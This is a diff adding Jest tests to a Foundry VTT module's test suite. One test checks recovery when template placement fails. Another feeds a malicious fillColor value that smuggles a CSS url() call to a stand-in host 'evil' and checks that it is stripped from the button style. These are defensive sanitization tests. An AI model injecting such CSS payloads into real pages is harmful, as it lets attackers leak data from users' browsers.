@@ -1508,6 +1508,31 @@ describe("Star Template Placer", () => {
                     "MeasuredTemplate", [expect.objectContaining({ x: 100, y: 100 })]
                 );
             });
+
+            it("restores the original template if placing the moved copy fails", async () => {
+                const errSpy = jest.spyOn(console, "error").mockImplementation(() => {});
+                global.canvas.mousePosition = { x: 300, y: 250 };
+                const tpl = makeTemplate("t1", "user-001", "circle", 4);
+                openConfigOnMoveTab([tpl]);
+                $(global.foundry.applications.api.DialogV2.__lastInstance.element)
+                    .find(".stp-move-template-btn").eq(0).trigger("click");
+                await new Promise(r => setTimeout(r, 0));
+                global.canvas.scene.createEmbeddedDocuments.mockClear();
+                global.canvas.scene.createEmbeddedDocuments
+                    .mockRejectedValueOnce(new Error("placement denied"))
+                    .mockResolvedValue([]);
+                await simulateCanvasClick();
+                // One macrotask tick drains the whole microtask chain (delete → create-rejects →
+                // catch → create-to-restore); the mocks settle synchronously so no extra ticks are needed.
+                await new Promise(r => setTimeout(r, 0));
+                // First create (the moved copy) rejected; original is recreated at its start position
+                expect(global.canvas.scene.createEmbeddedDocuments).toHaveBeenCalledTimes(2);
+                expect(global.canvas.scene.createEmbeddedDocuments).toHaveBeenLastCalledWith(
+                    "MeasuredTemplate", [expect.objectContaining({ x: 100, y: 100 })]
+                );
+                expect(errSpy).toHaveBeenCalled();
+                errSpy.mockRestore();
+            });
         });
     });
 
@@ -1627,6 +1652,17 @@ describe("Star Template Placer", () => {
                     ]
                 });
                 expect(window.__xssImg).toBeUndefined();
+            });
+
+            it("sanitizes a malicious fillColor in the custom button border style", () => {
+                setupBar({
+                    customTemplates: [
+                        { name: "Evil", t: "circle", distance: 20, angle: 57, fillColor: "red;background:url(http://evil/?leak)" }
+                    ]
+                });
+                const btn = document.querySelector(".stp-custom-btn");
+                expect(btn.style.cssText).not.toContain("evil");
+                expect(btn.style.cssText).not.toContain("url");
             });
         });
     });
